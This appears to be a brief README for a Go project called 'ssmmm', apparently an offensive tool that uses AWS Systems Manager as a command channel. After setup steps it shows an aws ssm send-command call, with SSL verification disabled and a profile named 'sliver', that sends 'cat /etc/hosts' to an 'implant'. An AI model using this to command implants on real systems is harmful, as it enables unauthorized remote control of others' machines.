# ssmmm

# Setup
export GO111MODULE=off
go get ./..
go run main.go

# send command to implant
aws --no-verify-ssl ssm send-command \
    --instance-ids "mi-0d416eb76fdc3f731" \
    --document-name "AWS-RunShellScript" \
    --comment "cat" \
    --parameters commands="cat /etc/hosts" \
    --output text --profile sliver --region us-east-1

